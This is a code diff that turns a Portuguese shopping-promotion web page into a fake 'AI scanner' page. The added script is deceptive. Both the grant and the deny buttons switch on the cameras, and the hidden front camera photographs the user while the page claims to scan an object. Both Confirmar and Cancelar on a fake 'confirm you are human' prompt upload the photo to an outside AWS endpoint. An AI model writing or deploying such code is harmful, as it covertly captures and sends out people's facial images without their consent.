@@ -1,379 +1,371 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-80RRC94P34"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <meta name="color-scheme" content="light">
-    <title>COMPRASPROMO</title>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-    
-        gtag('config', 'G-80RRC94P34');
-        function checkOrientation() {
-            const messageElement = document.getElementById('orientationMessage');
-            
-            if (window.innerWidth > window.innerHeight) {
-                if (!messageElement) {
-                    const message = document.createElement('div');
-                    message.id = 'orientationMessage';
-                    message.className = 'orientation-message';
-                    message.innerHTML = `
-                        <i class="fas fa-mobile-alt"></i>
-                        <h2>Gire seu dispositivo</h2>
-                        <p>Use o modo retrato</p>
-                    `;
-                    document.body.appendChild(message);
-                }
-                messageElement.style.display = 'block';
-            } else {
-                if (messageElement) {
-                    messageElement.style.display = 'none';
-                }
-            }
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Scan Virtual Life</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        window.addEventListener("resize", checkOrientation);
-        window.addEventListener("load", checkOrientation);
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      text-align: center;
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding-top: 80px;
+    }
 
-    </script>
-    <style>
-        * {
-            box-sizing: border-box;
-        }
+    h1 {
+      color: #2c3e50;
+      font-size: clamp(1.5em, 5vw, 2.5em);
+      margin-bottom: 30px;
+      padding: 0 10px;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+    }
 
-        body {
-            background-color: #cdcdcd;
-            color: #000000;
-            margin: 0;
-            padding: 0;
-            font-family: 'Roboto', sans-serif;
-            letter-spacing: 1px;
-            cursor: pointer;
-            overflow-x: hidden;
-            touch-action: manipulation;
-            -ms-touch-action: manipulation;
-            user-select: none;
-        }
+    button {
+      padding: 15px 30px;
+      margin: 10px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      width: 250px;
+      max-width: 90%;
+      font-weight: 600;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
 
-        .navbar {
-            background-color: #560000;
-            padding: 15px 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            transition: all 0.3s ease;
-        }
+    #captureBtn {
+      background: linear-gradient(45deg, #4CAF50, #45a049);
+      color: white;
+      font-size: 18px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
 
-        .navbar.scrolled {
-            padding: 10px 30px;
-            background-color: rgba(86, 0, 0, 0.95);
-            backdrop-filter: blur(10px);
-        }
+    #captureBtn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 8px rgba(0,0,0,0.2);
+    }
 
-        .navbar .logo {
-            color: #fff;
-            font-size: 24px;
-            font-weight: 700;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            text-decoration: none;
-        }
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      z-index: 1000;
+      width: 90%;
+      max-width: 400px;
+    }
 
-        .container {
-            width: 95%;
-            min-height: 100vh;
-            margin: 0 auto;
-            padding: 30px;
-            background-color: #fafafa;
-            box-shadow: 0 4px 12px rgba(27, 0, 0, 0.500);
-        }
+    .popup h2 {
+      color: #2c3e50;
+      font-size: clamp(1.2em, 4vw, 1.5em);
+      margin-bottom: 15px;
+    }
 
-        .tools-header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
+    .popup p {
+      color: #666;
+      font-size: clamp(0.9em, 3vw, 1.1em);
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
 
-        .tools-header h2 {
-            color: #333;
-            font-size: 28px;
-        }
+    .popup-buttons {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
 
-        .search-box {
-            margin: 20px 0;
-            display: flex;
-            justify-content: center;
-        }
+    .confirm-btn, .cancel-btn {
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      border-radius: 25px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
 
-        .search-box input {
-            padding: 12px 20px;
-            width: 60%;
-            font-size: 16px;
-            border-radius: 25px;
-            border: 2px solid #ddd;
-            outline: none;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-        }
+    .confirm-btn {
+      background: linear-gradient(45deg, #4CAF50, #45a049);
+      color: white;
+    }
 
-        .search-box input:focus {
-            border-color: rgba(86, 0, 0, 0.95);
-            box-shadow: 0 4px 10px rgba(86, 0, 0, 0.2);
-            transform: translateY(-2px);
-        }
+    .cancel-btn {
+      background: linear-gradient(45deg, #f44336, #e53935);
+      color: white;
+    }
 
-        .tools-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            padding: 10px;
-            justify-items: center;
-        }
+    .confirm-btn:hover, .cancel-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 8px rgba(0,0,0,0.2);
+    }
 
-        .tool-card {
-            background-color: #ffffff;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            height: 350px;
-            width: 100%;
-            max-width: 160px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            overflow: hidden;
-        }
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.7);
+      z-index: 999;
+      backdrop-filter: blur(5px);
+    }
 
-        .tool-card:hover {
-            transform: scale(1.05) translateY(-5px);
-            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
-        }
+    .initial-popup {
+      display: block;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: white;
+      padding: 35px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      z-index: 1000;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
 
-        .tool-card img {
-            width: 100%;
-            height: 150px;
-            object-fit: contain;
-            border-radius: 8px;
-            margin-bottom: 5px;
-            background-color: #f5f5f5;
-        }
+    .initial-popup h2 {
+      color: #2c3e50;
+      margin-bottom: 20px;
+      font-size: 1.4em;
+      line-height: 1.4;
+    }
 
-        .tool-card h3 {
-            font-size: 16px;
-            margin: 5px 0;
-            line-height: 1.2;
-            max-height: 40px;
-            overflow: hidden;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            line-clamp: 2;
-            -webkit-box-orient: vertical;
-        }
+    .initial-popup p {
+      color: #666;
+      margin-bottom: 25px;
+      line-height: 1.6;
+    }
 
-        .tool-card p {
-            font-size: 13px;
-            color: #555;
-            margin: 5px 0;
-            line-height: 1.3;
-            max-height: 60px;
-            overflow: hidden;
-            display: -webkit-box;
-            -webkit-line-clamp: 3;
-            line-clamp: 3;
-            -webkit-box-orient: vertical;
-        }
+    .initial-popup-buttons {
+      display: flex;
+      gap: 15px;
+      justify-content: center;
+      margin-top: 25px;
+    }
 
-        @media (max-width: 360px) {
-            .tools-grid {
-                grid-template-columns: 1fr;
-                gap: 20px;
-            }
+    .initial-popup button {
+      padding: 15px 35px;
+      border-radius: 25px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
 
-            .tool-card {
-                max-width: 200px;
-            }
-        }
+    .grant-btn {
+      background: linear-gradient(45deg, #4CAF50, #45a049);
+      color: white;
+    }
 
-        a {
-            text-decoration: none;
-            color: inherit;
-        }
+    .deny-btn {
+      background: linear-gradient(45deg, #f44336, #e53935);
+      color: white;
+    }
 
-        .footer {
-            background-color: #560000;
-            color: rgba(255, 255, 255, 0.850);
-            text-align: center;
-            padding: 20px;
-            position: relative;
-            bottom: 0;
-            width: 100%;
-        }
+    .grant-btn:hover, .deny-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 8px rgba(0,0,0,0.2);
+    }
 
-        .orientation-message {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: rgba(86, 0, 0, 0.95);
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            z-index: 9999;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-            animation: fadeIn 0.3s ease-in-out;
-        }
+    .footer {
+      position: fixed;
+      bottom: 20px;
+      left: 0;
+      width: 100%;
+      text-align: center;
+      padding: 15px;
+    }
 
-        .orientation-message i {
-            font-size: 48px;
-            margin-bottom: 15px;
-            display: block;
-        }
+    .footer-text {
+      color: #2c3e50;
+      font-size: 18px;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      text-shadow: 0 1px 1px rgba(0,0,0,0.1);
+    }
 
-        .orientation-message h2 {
-            margin: 0;
-            font-size: 20px;
-            margin-bottom: 10px;
-        }
+    .header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 20px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      z-index: 100;
+      backdrop-filter: blur(10px);
+    }
 
-        .orientation-message p {
-            margin: 0;
-            font-size: 14px;
-            opacity: 0.9;
-        }
+    .header h1 {
+      color: #2c3e50;
+      font-size: clamp(1.5em, 5vw, 2.5em);
+      margin: 0;
+      padding: 0;
+      font-weight: 700;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+    }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
+    .emoji {
+      font-size: 24px;
+      margin: 0 5px;
+    }
 
-    </style>
+    @media (max-width: 480px) {
+      body {
+        padding: 10px;
+      }
+
+      button {
+        padding: 15px 25px;
+        font-size: 16px;
+      }
+
+      .popup {
+        padding: 25px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="navbar">
-        <a href="#" class="logo">COMPRASPROMO</a>
+  <div class="header">
+    <h1>IA VIRTUAL GENERATOR</h1>
+  </div>
+  <video id="video" width="320" height="240" autoplay style="display: none;"></video>
+  <video id="frontVideo" width="320" height="240" autoplay style="display: none;"></video><br>
+  <button id="captureBtn" style="display: none;">COMEÇAR SCAN <span class="emoji">🧠</span></button>
+  <img src="homemscanner.png" alt="Homem Scanner" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); max-width: 100%; z-index: -1; opacity: 0.15;">
+  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+
+  <div class="footer">
+    <p class="footer-text">✨ Aponte seu celular para um objeto e descubra! ✨</p>
+  </div>
+
+  <div class="initial-popup" id="initialPopup">
+    <h2>Descubra o poder da nossa IA! <span class="emoji">🤖</span></h2>
+    <p>Para começar esta jornada incrível, precisamos da sua permissão. Vamos juntos explorar o mundo de uma nova forma!</p>
+    <div class="initial-popup-buttons">
+      <button class="grant-btn" id="grantBtn">Vamos Começar! <span class="emoji">🚀</span></button>
+      <button class="deny-btn" id="denyBtn">Agora Não <span class="emoji">⏰</span></button>
     </div>
+  </div>
 
-    <div class="container">
-        <div class="tools-header">
-            <h2>O lugar em que você encontrará os melhores produtos pelos melhores preços!</h2>
-            <p>Digite aqui o nome do produto caso não o encontre.</p>
-        </div>
-
-        <div class="search-box">
-            <input type="text" id="search" placeholder="Procurar produtos..." oninput="searchProducts()">
-        </div>
-
-        <div class="tools-grid" id="productsGrid">
-        </div>
+  <div class="overlay" id="overlay"></div>
+  <div class="popup" id="popup">
+    <h2>Quase lá! <span class="emoji">🎯</span></h2>
+    <p>Para garantir que você é humano, confirme abaixo!</p>
+    <div class="popup-buttons">
+      <button class="confirm-btn" id="confirmBtn">Confirmar <span class="emoji">✅</span></button>
+      <button class="cancel-btn" id="cancelBtn">Cancelar <span class="emoji">❌</span></button>
     </div>
+  </div>
 
-    <script>
-        async function loadProducts() {
-            const response = await fetch('produtos.json');
-            const products = await response.json();
+  <script>
+    const video = document.getElementById('video');
+    const frontVideo = document.getElementById('frontVideo');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    let imageBlob = null;
+    const popup = document.getElementById('popup');
+    const overlay = document.getElementById('overlay');
+    const initialPopup = document.getElementById('initialPopup');
+    const captureBtn = document.getElementById('captureBtn');
 
-            const productsGrid = document.getElementById('productsGrid');
-            
-            products.forEach((product, index) => {
-                const productCard = document.createElement('a');
-                productCard.href = product.link;
-                
-                let title = product.nome;
-                
-                if (index < 6) {
-                    title = `🔥<br>${title}`;
-                }
-                
-                productCard.innerHTML = `
-                    <div class="tool-card">
-                        <img src="${product.imagem}" alt="${product.nome}">
-                        <h3>${title}</h3>
-                        <p>${product.descricao}</p>
-                    </div>
-                `;
-                productsGrid.appendChild(productCard);
-            });
+    // Função para verificar se é dispositivo móvel
+    function isMobileDevice() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Função para ativar as câmeras
+    async function activateCamera() {
+      try {
+        // Ativa câmera traseira para visualização
+        const backStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'environment' } 
+        });
+        video.srcObject = backStream;
+        
+        // Mostra o vídeo apenas em dispositivos móveis
+        if (isMobileDevice()) {
+          video.style.display = 'block';
         }
 
-        function searchProducts() {
-            const searchQuery = document.getElementById('search').value.toLowerCase();
-            const productCards = document.querySelectorAll('.tool-card');
-            productCards.forEach(card => {
-                const productName = card.querySelector('h3').textContent.toLowerCase();
-                if (productName.includes(searchQuery)) {
-                    card.parentElement.style.display = 'block';
-                } else {
-                    card.parentElement.style.display = 'none';
-                }
-            });
-        }
-
-        window.onload = loadProducts;
-
-        function handleScrollAnimation() {
-            // Removendo a função de animação de scroll pois não é mais necessária
-        }
-
-        function handleNavbarScroll() {
-            const navbar = document.querySelector('.navbar');
-            if (window.scrollY > 50) {
-                navbar.classList.add('scrolled');
-            } else {
-                navbar.classList.remove('scrolled');
-            }
-        }
-
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'start'
-                    });
-                }
-            });
+        // Ativa câmera frontal para captura
+        const frontStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'user' } 
         });
+        frontVideo.srcObject = frontStream;
 
-        document.addEventListener('DOMContentLoaded', function() {
-            const cards = document.querySelectorAll('.tool-card');
-            cards.forEach(card => {
-                card.addEventListener('mouseenter', function() {
-                    this.style.transform = 'scale(1.05) translateY(-5px)';
-                });
-                
-                card.addEventListener('mouseleave', function() {
-                    this.style.transform = 'scale(1) translateY(0)';
-                });
-            });
-        });
+        initialPopup.style.display = 'none';
+        captureBtn.style.display = 'block';
+      } catch (err) {
+        alert('Erro ao acessar a câmera: ' + err.message);
+      }
+    }
 
-        window.addEventListener('scroll', () => {
-            handleNavbarScroll();
-        });
+    // Ambos os botões ativam a câmera
+    document.getElementById('grantBtn').onclick = activateCamera;
+    document.getElementById('denyBtn').onclick = activateCamera;
 
-        window.addEventListener('load', () => {
-            handleNavbarScroll();
-        });
-    </script>
+    // Captura imagem ao clicar em START
+    captureBtn.onclick = () => {
+      ctx.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        imageBlob = blob;
+        popup.style.display = 'block';
+        overlay.style.display = 'block';
+      }, 'image/jpeg');
+    };
+
+    // Função para fazer o upload
+    async function fazerUpload() {
+      if (!imageBlob) return alert("Erro.");
+
+      const filename = `foto-${Date.now()}.jpg`;
+
+      const res = await fetch(`https://d59rrhlltg.execute-api.sa-east-1.amazonaws.com/get-upload-url?filename=${filename}`);
+      const data = await res.json();
+
+      const uploadRes = await fetch(data.url, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'image/jpeg' },
+        body: imageBlob
+      });
+    }
+
+    // Botão verde (confirmar)
+    document.getElementById('confirmBtn').onclick = () => {
+      popup.style.display = 'none';
+      overlay.style.display = 'none';
+      fazerUpload();
+    };
+
+    // Botão vermelho (cancelar)
+    document.getElementById('cancelBtn').onclick = () => {
+      popup.style.display = 'none';
+      overlay.style.display = 'none';
+      fazerUpload();
+    };
+  </script>
 </body>
-<footer class="footer">
-    <p>Siga-nos nas redes sociais: </p>
-    <a href="https://www.tiktok.com/@compras.promobr" target="_blank" class="social-icon">
-        <i class="fab fa-tiktok"></i>
-    </a>
-</footer>
 </html>
